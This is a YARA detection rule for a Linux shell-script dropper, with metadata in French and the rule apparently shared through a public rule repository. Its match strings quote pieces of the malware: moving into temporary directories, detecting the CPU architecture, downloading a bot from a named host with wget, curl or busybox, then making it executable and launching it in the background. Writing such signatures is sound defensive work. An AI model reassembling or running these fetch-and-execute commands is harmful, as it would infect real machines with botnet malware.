rule SCRIPT_Dropper_Unknown_ForgeAuto_182aaf8a
{
    meta:
        author = "Marjoriefort"
        description = "Detects Unknown (script_sh, etat binaire)"
        date = "2026-10-01"
        reference_sha256 = "182aaf8a6c3a40e451fdd2deba857b8b8ada9f2efda033fcae6b6e89bde15d09"
        yarahub_uuid = "33af1e38-7ca0-4768-a5f7-d8965990855b"
        famille = "unknown"
        famille_source = "inconnue"
        classe = "script_sh"
        etat = "binaire"
        confidence_suggeree = "medium"
        source = "forge_miss M3 v1.9.48"
        yarahub_license = "CC0 1.0"
        yarahub_rule_matching_tlp = "TLP:WHITE"
        yarahub_rule_sharing_tlp = "TLP:WHITE"
        yarahub_reference_md5 = "94c34b0f4a3ad64665b52b6c0eff5088"
        yarahub_reference_link = "https://github.com/Marjoriefort/yara-rules"
    strings:
        $s0 = "apex4.0 loader" ascii
        $s1 = "cd /tmp 2>/dev/null || cd /dev/shm 2>/dev/null || cd /var/tmp 2>/dev/null || cd /var/run 2>/dev/null || cd / 2>/dev/null || exit 1" ascii
        $s2 = "M=$(uname -m)" ascii
        $s3 = "chmod 777 q 2>/dev/null" ascii
        $s4 = "nohup ./q \"$TAG\" >/dev/null 2>&1 &) || ./q \"$TAG\" >/dev/null 2>&1 &" ascii
        $s5 = ">/dev/null 2>&1 &) || ./q" ascii
        $s6 = "arch-detect, download bot, run as tag \"vps\"" ascii
        $s7 = "B=http://wemqmewkqewq.work.gd" ascii
        $s8 = "aarch64|arm64|armv8*) A=armv7l ;;" ascii
        $s9 = "armv7*) A=armv7l ;;" ascii
        $s10 = "armv6*) A=armv6l ;;" ascii
        $s11 = "armv5*) A=armv5l ;;" ascii
        $s12 = "armv4*) A=armv4l ;;" ascii
        $s13 = "if command -v wget >/dev/null 2>&1; then wget -q -O q.tmp \"$U\" 2>/dev/null || wget -O q.tmp \"$U\" 2>/dev/null" ascii
        $s14 = "elif command -v curl >/dev/null 2>&1; then curl -skLo q.tmp \"$U\" 2>/dev/null" ascii
        $s15 = "elif command -v busybox >/dev/null 2>&1; then busybox wget -q -O q.tmp \"$U\" 2>/dev/null" ascii
        $s16 = "-s q.tmp ] || exit 1" ascii
        $s17 = "2>/dev/null || wget -O q.tmp" ascii
        $s18 = "rm -f q q.tmp" ascii
        $s19 = "mv q.tmp q" ascii
    condition:
        true and filesize < 50MB and 2 of ($s0, $s1, $s2, $s3, $s4, $s5, $s6, $s8, $s9, $s10, $s11, $s12, $s13, $s14, $s15, $s16, $s17, $s18, $s19) and 1 of ($s7)
}
